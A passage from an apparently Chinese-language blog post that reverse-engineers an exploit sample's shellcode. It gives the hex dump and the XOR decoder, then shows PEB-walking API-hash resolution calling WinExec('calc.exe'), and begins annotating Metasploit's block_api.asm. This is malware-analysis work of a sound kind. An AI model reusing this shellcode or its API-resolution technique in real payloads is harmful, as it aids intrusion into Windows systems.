class="built_in">ebp</span>-<span class="number">0x3</span>]</span><br><span class="line">....00BC    <span class="number">44</span>              <span class="keyword">inc</span> <span class="built_in">esp</span></span><br><span class="line">....00BD    7E 7E           <span class="keyword">jle</span> short ....<span class="number">013D</span></span><br><span class="line">....00BF    2B8A 87FDDE72   <span class="keyword">sub</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0x72DEFD87</span>]</span><br><span class="line">....00C5    7C <span class="number">1D</span>           <span class="keyword">jl</span> short ....00E4</span><br><span class="line">....00C7    AB              stos <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>]</span><br><span class="line">....00C8    <span class="number">77</span> <span class="number">38</span>           <span class="keyword">ja</span> short ....<span class="number">0102</span></span><br><span class="line">....00CA    <span class="number">99</span>              <span class="keyword">cdq</span></span><br><span class="line">....00CB    <span class="number">47</span>              <span class="keyword">inc</span> <span class="built_in">edi</span></span><br><span class="line">....00CC    <span class="number">05</span> 514C68BA     <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="number">0xBA684C51</span></span><br><span class="line">....00D1    <span class="number">52</span>              <span class="keyword">push</span> <span class="built_in">edx</span></span><br><span class="line">....00D2    <span class="number">45</span>              <span class="keyword">inc</span> <span class="built_in">ebp</span></span><br><span class="line">....00D3    0B5D C1         <span class="keyword">or</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x3F</span>]</span><br><span class="line">....00D6    <span class="number">05</span> E2F861AF     <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="number">0xAF61F8E2</span></span><br><span class="line">....00<span class="built_in">DB</span>    FA              <span class="keyword">cli</span></span><br><span class="line">....00DC    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00DE    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E0    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E2    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E4    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E6    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br></pre></td></tr></table></figure></p><p><strong><code>解码后：</code></strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 内存：</span></span><br><span class="line"><span class="comment">;....0000  BA 6D A5 42 5E DD C4 D9 74 24 F4 5D 31 C9 B1 31  簃^菽賢$鬩1杀1</span></span><br><span class="line"><span class="comment">;....0010  83 C5 04 31 55 0F 03 55 0F E2 F5 FC E8 82 00 00  兣1UU怩?.</span></span><br><span class="line"><span class="comment">;....0020  00 60 89 E5 31 C0 64 8B 50 30 8B 52 0C 8B 52 14  .`夊1纃婸0婻.婻</span></span><br><span class="line"><span class="comment">;....0030  8B 72 28 0F B7 4A 26 31 FF AC 3C 61 7C 02 2C 20  媟(稪&amp;1?a|,</span></span><br><span class="line"><span class="comment">;....0040  C1 CF 0D 01 C7 E2 F2 52 57 8B 52 10 8B 4A 3C 8B  料.氢騌W婻婮&lt;</span></span><br><span class="line"><span class="comment">;....0050  4C 11 78 E3 48 01 D1 51 8B 59 20 01 D3 8B 49 18  Lx鉎裃媃 計I</span></span><br><span class="line"><span class="comment">;....0060  E3 3A 49 8B 34 8B 01 D6 31 FF AC C1 CF 0D 01 C7  ?I????</span></span><br><span class="line"><span class="comment">;....0070  38 E0 75 F6 03 7D F8 3B 7D 24 75 E4 58 8B 58 24  8鄒?&#125;?&#125;$u鋁媂$</span></span><br><span class="line"><span class="comment">;....0080  01 D3 66 8B 0C 4B 8B 58 1C 01 D3 8B 04 8B 01 D0  觙?K媂計?</span></span><br><span class="line"><span class="comment">;....0090  89 44 24 24 5B 5B 61 59 5A 51 FF E0 5F 5F 5A 8B  塂$$[[aYZQ郷_Z</span></span><br><span class="line"><span class="comment">;....00A0  12 EB 8D 5D 6A 01 8D 85 B2 00 00 00 50 68 31 8B  雿]j崊?..Ph1</span></span><br><span class="line"><span class="comment">;....00B0  6F 87 FF D5 BB F0 B5 A2 56 68 A6 95 BD 9D FF D5  o?栈鸬h綕</span></span><br><span class="line"><span class="comment">;....00C0  3C 06 7C 0A 80 FB E0 75 05 BB 47 13 72 6F 6A 00  &lt;|.€u籊roj.</span></span><br><span class="line"><span class="comment">;....00D0  53 FF D5 63 61 6C 63 2E 65 78 65 00 0C 0C 0C 0C  S誧alc.exe.....</span></span><br><span class="line"><span class="comment">;....00E0  0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ................</span></span><br><span class="line"><span class="comment">;....00F0  0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ................</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 反汇编：</span></span><br><span class="line">....<span class="number">0000</span>    BA 6DA5425E     <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="number">0x5E42A56D</span>                          <span class="comment">; edx=0x5E42A56D,异或数</span></span><br><span class="line">....<span class="number">0005</span>    DDC4            <span class="keyword">ffree</span> <span class="built_in">st</span>(<span class="number">4</span>)                                 <span class="comment">;</span></span><br><span class="line">....<span class="number">0007</span>    D97424 F4       <span class="keyword">fstenv</span> (<span class="number">28</span>-<span class="built_in">byte</span>) <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>-<span class="number">0xC</span>]           <span class="comment">; 保存FPU环境,0x0C0C0D3C-0x0C0C0D58</span></span><br><span class="line">....<span class="number">000B</span>    <span class="number">5D</span>              <span class="keyword">pop</span> <span class="built_in">ebp</span>                                     <span class="comment">; ebp=0x....0005</span></span><br><span class="line">....000C    31C9            <span class="keyword">xor</span> <span class="built_in">ecx</span>,<span class="built_in">ecx</span>                                 <span class="comment">; ecx=0x0</span></span><br><span class="line">....000E    B1 <span class="number">31</span>           <span class="keyword">mov</span> <span class="built_in">cl</span>,<span class="number">0x31</span>                                 <span class="comment">; cl=0x31=49,49个双字待异或解密数据</span></span><br><span class="line">....<span class="number">0010</span>    83C5 <span class="number">04</span>         <span class="keyword">add</span> <span class="built_in">ebp</span>,<span class="number">0x4</span>                                 <span class="comment">; ebp=0x....0005+0x4=0x....0009</span></span><br><span class="line">....<span class="number">0013</span>    <span class="number">3155</span> 0F         <span class="keyword">xor</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0xF</span>],<span class="built_in">edx</span>              <span class="comment">; [ebp+0xf]=[0x....0018]=0xA2B74762,异或解密0x18-0xDB的代码</span></span><br><span class="line">....<span class="number">0016</span>    <span class="number">0355</span> 0F         <span class="keyword">add</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0xF</span>]              <span class="comment">; edx=edx+[ebp+0xf]=0x5E42A56D+0xFCF5E20F=0x5B38877C</span></span><br><span class="line">....<span class="number">0019</span>  ^ E2 F5           loopd short ....<span class="number">0010</span>                        <span class="comment">; 跳转到0x....0010,ecx=ecx-1</span></span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">....<span class="number">001B</span>    FC              <span class="keyword">cld</span>                                         <span class="comment">; 方向标志位DF清零,lodsb指令根据DF改变esi</span></span><br><span class="line">....001C    E8 <span class="number">82000000</span>     <span class="keyword">call</span> ....00A3                               <span class="comment">; 返回地址为0x....0021</span></span><br><span class="line">....<span class="number">0021</span>    <span class="number">60</span>              <span class="keyword">pushad</span></span><br><span class="line">....<span class="number">0022</span>    89E5            <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line">....<span class="number">0024</span>    31C0            <span class="keyword">xor</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line">....<span class="number">0026</span>    <span class="number">64</span>:8B50 <span class="number">30</span>      <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="built_in">eax</span>+<span class="number">0x30</span>]</span><br><span class="line">....002A    8B52 0C         <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0xC</span>]</span><br><span class="line">....<span class="number">002D</span>    8B52 <span class="number">14</span>         <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0x14</span>]</span><br><span class="line">....<span class="number">0030</span>    8B72 <span class="number">28</span>         <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0x28</span>]</span><br><span class="line">....<span class="number">0033</span>    0FB74A <span class="number">26</span>       <span class="keyword">movzx</span> <span class="built_in">ecx</span>,<span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0x26</span>]</span><br><span class="line">....<span class="number">0037</span>    31FF            <span class="keyword">xor</span> <span class="built_in">edi</span>,<span class="built_in">edi</span>                   ---+</span><br><span class="line">....<span class="number">0039</span>    AC              lods <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]           |</span><br><span class="line">....003A    3C <span class="number">61</span>           <span class="keyword">cmp</span> <span class="built_in">al</span>,<span class="number">0x61</span>                      |</span><br><span class="line">....003C    7C <span class="number">02</span>           <span class="keyword">jl</span> short ....<span class="number">0040</span>                | 计算dll名称hash</span><br><span class="line">....003E    2C <span class="number">20</span>           <span class="keyword">sub</span> <span class="built_in">al</span>,<span class="number">0x20</span>                      |</span><br><span class="line">....<span class="number">0040</span>    C1CF <span class="number">0D</span>         <span class="keyword">ror</span> <span class="built_in">edi</span>,<span class="number">0xD</span>                      |</span><br><span class="line">....<span class="number">0043</span>    01C7            <span class="keyword">add</span> <span class="built_in">edi</span>,<span class="built_in">eax</span>                      |</span><br><span class="line">....<span class="number">0045</span>  ^ E2 F2           loopd short ....<span class="number">0039</span>          ---+</span><br><span class="line">....<span class="number">0047</span>    <span class="number">52</span>              <span class="keyword">push</span> <span class="built_in">edx</span></span><br><span class="line">....<span class="number">0048</span>    <span class="number">57</span>              <span class="keyword">push</span> <span class="built_in">edi</span></span><br><span class="line">....<span class="number">0049</span>    8B52 <span class="number">10</span>         <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0x10</span>]</span><br><span class="line">....004C    8B4A 3C         <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0x3C</span>]</span><br><span class="line">....004F    8B4C11 <span class="number">78</span>       <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="built_in">edx</span>+<span class="number">0x78</span>]</span><br><span class="line">....<span class="number">0053</span>    E3 <span class="number">48</span>           <span class="keyword">jecxz</span> short ....<span class="number">009D</span></span><br><span class="line">....<span class="number">0055</span>    01D1            <span class="keyword">add</span> <span class="built_in">ecx</span>,<span class="built_in">edx</span></span><br><span class="line">....<span class="number">0057</span>    <span class="number">51</span>              <span class="keyword">push</span> <span class="built_in">ecx</span></span><br><span class="line">....<span class="number">0058</span>    8B59 <span class="number">20</span>         <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0x20</span>]</span><br><span class="line">....005B    01D3            <span class="keyword">add</span> <span class="built_in">ebx</span>,<span class="built_in">edx</span></span><br><span class="line">....<span class="number">005D</span>    8B49 <span class="number">18</span>         <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0x18</span>]</span><br><span class="line">....<span class="number">0060</span>    E3 3A           <span class="keyword">jecxz</span> short ....009C</span><br><span class="line">....<span class="number">0062</span>    <span class="number">49</span>              <span class="keyword">dec</span> <span class="built_in">ecx</span></span><br><span class="line">....<span class="number">0063</span>    8B348B          <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+<span class="built_in">ecx</span>*<span class="number">4</span>]</span><br><span class="line">....<span class="number">0066</span>    01D6            <span class="keyword">add</span> <span class="built_in">esi</span>,<span class="built_in">edx</span></span><br><span class="line">....<span class="number">0068</span>    31FF            <span class="keyword">xor</span> <span class="built_in">edi</span>,<span class="built_in">edi</span>                  ---+</span><br><span class="line">....006A    AC              lods <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]          |</span><br><span class="line">....006B    C1CF <span class="number">0D</span>         <span class="keyword">ror</span> <span class="built_in">edi</span>,<span class="number">0xD</span>                     |</span><br><span class="line">....006E    01C7            <span class="keyword">add</span> <span class="built_in">edi</span>,<span class="built_in">eax</span>                     | 计算函数名hash</span><br><span class="line">....<span class="number">0070</span>    38E0            <span class="keyword">cmp</span> <span class="built_in">al</span>,<span class="number">ah</span>                       |</span><br><span class="line">....<span class="number">0072</span>  ^ <span class="number">75</span> F6           <span class="keyword">jnz</span> short ....006A           ---+    </span><br><span class="line">....<span class="number">0074</span>    <span class="number">037D</span> F8         <span class="keyword">add</span> <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x8</span>]  | api_hash = dll_name_hash + func_name_hash</span><br><span class="line">....<span class="number">0077</span>    3B7D <span class="number">24</span>         <span class="keyword">cmp</span> <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0x24</span>] |</span><br><span class="line">....007A  ^ <span class="number">75</span> E4           <span class="keyword">jnz</span> short ....<span class="number">0060</span>           ---+</span><br><span class="line">....007C    <span class="number">58</span>              <span class="keyword">pop</span> <span class="built_in">eax</span></span><br><span class="line">....<span class="number">007D</span>    8B58 <span class="number">24</span>         <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x24</span>]</span><br><span class="line">....<span class="number">0080</span>    01D3            <span class="keyword">add</span> <span class="built_in">ebx</span>,<span class="built_in">edx</span></span><br><span class="line">....<span class="number">0082</span>    <span class="number">66</span>:8B0C4B       <span class="keyword">mov</span> <span class="built_in">cx</span>,<span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+<span class="built_in">ecx</span>*<span class="number">2</span>]</span><br><span class="line">....<span class="number">0086</span>    8B58 1C         <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x1C</span>]</span><br><span class="line">....<span class="number">0089</span>    01D3            <span class="keyword">add</span> <span class="built_in">ebx</span>,<span class="built_in">edx</span></span><br><span class="line">....008B    8B048B          <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+<span class="built_in">ecx</span>*<span class="number">4</span>]</span><br><span class="line">....008E    01D0            <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line">....<span class="number">0090</span>    <span class="number">894424</span> <span class="number">24</span>       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>+<span class="number">0x24</span>],<span class="built_in">eax</span></span><br><span class="line">....<span class="number">0094</span>    5B              <span class="keyword">pop</span> <span class="built_in">ebx</span></span><br><span class="line">....<span class="number">0095</span>    5B              <span class="keyword">pop</span> <span class="built_in">ebx</span></span><br><span class="line">....<span class="number">0096</span>    <span class="number">61</span>              <span class="keyword">popad</span></span><br><span class="line">....<span class="number">0097</span>    <span class="number">59</span>              <span class="keyword">pop</span> <span class="built_in">ecx</span></span><br><span class="line">....<span class="number">0098</span>    5A              <span class="keyword">pop</span> <span class="built_in">edx</span></span><br><span class="line">....<span class="number">0099</span>    <span class="number">51</span>              <span class="keyword">push</span> <span class="built_in">ecx</span></span><br><span class="line">....009A  ^ FFE0            <span class="keyword">jmp</span> <span class="built_in">eax</span>                         <span class="comment">; 调用查找到的所需api函数</span></span><br><span class="line">....009C    5F              <span class="keyword">pop</span> <span class="built_in">edi</span></span><br><span class="line">....<span class="number">009D</span>    5F              <span class="keyword">pop</span> <span class="built_in">edi</span></span><br><span class="line">....009E    5A              <span class="keyword">pop</span> <span class="built_in">edx</span></span><br><span class="line">....009F    8B12            <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>]</span><br><span class="line">....00A1  ^ EB <span class="number">8D</span>           <span class="keyword">jmp</span> short ....<span class="number">0030</span></span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">....00A3    <span class="number">5D</span>              <span class="keyword">pop</span> <span class="built_in">ebp</span>                 <span class="comment">; ebp=0x....0021</span></span><br><span class="line">....00A4    6A <span class="number">01</span>           <span class="keyword">push</span> <span class="number">0x1</span></span><br><span class="line">....00A6    8D85 B2000000   <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0xB2</span>] <span class="comment">; eax=ebp+0xB2=0x....0021+0xB2=0x....00D3(calc.exe)</span></span><br><span class="line">....00AC    <span class="number">50</span>              <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">....00AD    <span class="number">68</span> 318B6F87     <span class="keyword">push</span> <span class="number">0x876F8B31</span>         <span class="comment">; WinExec(kernel32.dll),通过hash算法算出的api_hash</span></span><br><span class="line">....00B2    FFD5            <span class="keyword">call</span> <span class="built_in">ebp</span></span><br><span class="line">....00B4    BB F0B5A256     <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="number">0x56A2B5F0</span>      <span class="comment">; ExitProcess(kernel32.dll)</span></span><br><span class="line">....00B9    <span class="number">68</span> A695BD9D     <span class="keyword">push</span> <span class="number">0x9DBD95A6</span>         <span class="comment">; GetVersion(kernel32.dll)</span></span><br><span class="line">....00BE    FFD5            <span class="keyword">call</span> <span class="built_in">ebp</span></span><br><span class="line">....00C0    3C <span class="number">06</span>           <span class="keyword">cmp</span> <span class="built_in">al</span>,<span class="number">0x6</span></span><br><span class="line">....00C2    7C 0A           <span class="keyword">jl</span> short ....00CE</span><br><span class="line">....00C4    80FB E0         <span class="keyword">cmp</span> <span class="built_in">bl</span>,<span class="number">0xE0</span></span><br><span class="line">....00C7    <span class="number">75</span> <span class="number">05</span>           <span class="keyword">jnz</span> short ....00CE</span><br><span class="line">....00C9    BB 4713726F     <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="number">0x6F721347</span>      <span class="comment">; RtlExitUserThread(ntdll.dll)</span></span><br><span class="line">....00CE    6A <span class="number">00</span>           <span class="keyword">push</span> <span class="number">0x0</span></span><br><span class="line">....00D0    <span class="number">53</span>              <span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line">....00D1    FFD5            <span class="keyword">call</span> <span class="built_in">ebp</span></span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">....00D3    <span class="number">6361</span> 6C         <span class="keyword">arpl</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0x6C</span>],<span class="built_in">sp</span>     <span class="comment">; "calc.exe\x00"</span></span><br><span class="line">....00D6    632E            <span class="keyword">arpl</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>],<span class="built_in">bp</span></span><br><span class="line">....00D8    <span class="number">65</span>:<span class="number">78</span> <span class="number">65</span>        <span class="keyword">js</span> short 03d10140</span><br><span class="line">....00<span class="built_in">DB</span>    000C0C          <span class="keyword">add</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>+<span class="built_in">ecx</span>],<span class="built_in">cl</span></span><br><span class="line">....00DE    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E0    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E2    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E4    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E6    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E8    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;解码完<code>shellcode</code>,然后通过<code>TEB</code>、<code>PEB</code>等结构计算出<code>WinExec()</code>函数的地址,调用<code>WinExec(&quot;calc.exe&quot;,0x1)</code>弹出计算器。计算<code>库函数API地址</code>的shellcode使用的是<code>metasploit-framework</code>中的<a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm" target="_blank" rel="noopener">block_api.asm</a>,此版本为<code>最新版本</code>,近期<code>更新</code>过,与<code>样本</code>中的有些许差别。其<code>具体原理</code>准备重新写一篇文章,这篇就不介绍了,下面的<code>注释</code>写的已经很清楚了。其<code>功能</code>如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;-----------------------------------------------------------------------------;</span></span><br><span class="line"><span class="comment">; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)</span></span><br><span class="line"><span class="comment">; Compatible: NT4 and newer</span></span><br><span class="line"><span class="comment">; Architecture: x86</span></span><br><span class="line"><span class="comment">; Size: 140 bytes</span></span><br><span class="line"><span class="comment">;-----------------------------------------------------------------------------;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; [BITS16]表示这个段是按照16位进行编译的，代码地址(比如一个label)都是16位的；[BITS32]表示编译时这个段中指令的地址都是32位的。</span></span><br><span class="line">[<span class="meta">BITS</span> <span class="number">32</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">; Input: The hash of the API to call and all its parameters must be pushed onto stack.</span></span><br><span class="line"><span class="comment">; 输入：要调用的API的hash以及其参数都要布置在栈上。</span></span><br><span class="line"><span class="comment">; Output: The return value from the API call will be in EAX.</span></span><br><span class="line"><span class="comment">; 输出：API调用的返回值将存储在EAX中。</span></span><br><span class="line"><span class="comment">; Clobbers: EAX, ECX and EDX (ala the normal stdcall calling convention)</span></span><br><span class="line"><span class="comment">; Clobbers: EAX, ECX and EDX.汇编中被使用的寄存器的列表(一般的stdcall调用约定)</span></span><br><span class="line"><span class="comment">; Un-Clobbered: EBX, ESI, EDI, ESP and EBP can be expected to remain un-clobbered.</span></span><br><span class="line"><span class="comment">; Un-Clobbered: 预计EBX，ESI，EDI，ESP和EBP不会受到干扰.asm程序外使用这些寄存器,不会受到影响</span></span><br><span class="line"><span class="comment">; <span class="doctag">Note:</span> This function assumes the direction flag has allready been cleared via a CLD instruction.</span></span><br><span class="line"><span class="comment">; 注意：此函数假定方向标志(DF)已通过CLD指令清除。lodsb指令与其有关。</span></span><br><span class="line"><span class="comment">; <span class="doctag">Note:</span> This function is unable to call forwarded 